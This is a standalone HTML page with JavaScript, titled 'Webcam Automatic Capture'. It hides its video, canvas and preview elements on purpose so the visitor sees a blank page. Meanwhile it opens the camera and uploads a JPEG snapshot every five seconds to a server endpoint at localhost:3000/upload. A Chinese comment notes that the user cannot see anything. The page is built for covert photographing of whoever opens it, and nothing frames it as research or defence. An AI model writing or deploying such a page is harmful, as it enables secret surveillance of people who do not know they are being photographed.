<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Webcam Automatic Capture</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            background-color: #f0f0f0;
        }
        
        /* 隐藏所有元素，页面将是空白的 */
        #webcam, #canvas, #previewContainer {
            display: none;
        }
    </style>
</head>
<body>

    <video id="webcam" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <div id="previewContainer">
        <img id="previewImage" alt=""/>
    </div>

    <script>
        const webcamVideo = document.getElementById('webcam');
        const canvas = document.getElementById('canvas');
        const previewImage = document.getElementById('previewImage');
        
        let stream = null;
        let isUploading = false;
        const UPLOAD_INTERVAL = 5000; // 5秒
        let intervalId = null;

        // 核心的拍照上传函数
        async function captureAndUpload() {
            if (isUploading || !stream) {
                return;
            }

            isUploading = true;

            const videoSettings = stream.getVideoTracks()[0].getSettings();
            canvas.width = videoSettings.width;
            canvas.height = videoSettings.height;

            const context = canvas.getContext('2d');
            context.drawImage(webcamVideo, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(async (blob) => {
                // 虽然用户看不到，但我们仍可以更新预览图
                // previewImage.src = URL.createObjectURL(blob); 
                
                const formData = new FormData();
                formData.append('photo', blob, `capture-${Date.now()}.jpg`);
                
                try {
                    const response = await fetch('http://localhost:3000/upload', {
                        method: 'POST',
                        body: formData,
                    });

                    if (response.ok) {
                        console.log('Upload successful');
                    } else {
                        console.error('Upload failed:', response.statusText);
                    }
                } catch (error) {
                    console.error('Upload error:', error);
                } finally {
                    isUploading = false;
                }

            }, 'image/jpeg', 0.9);
        }

        // 初始化摄像头并启动定时器
        async function init() {
            try {
                if (stream) {
                    stream.getTracks().forEach(track => track.stop());
                }
                
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { width: 1280, height: 720 }, 
                    audio: false 
                });
                webcamVideo.srcObject = stream;
                
                webcamVideo.onloadedmetadata = () => {
                    if (intervalId) {
                        clearInterval(intervalId);
                    }
                    intervalId = setInterval(captureAndUpload, UPLOAD_INTERVAL);
                };

            } catch (error) {
                console.error('Camera access error:', error);
            }
        }

        // 启动
        init();
    </script>
</body>
</html>
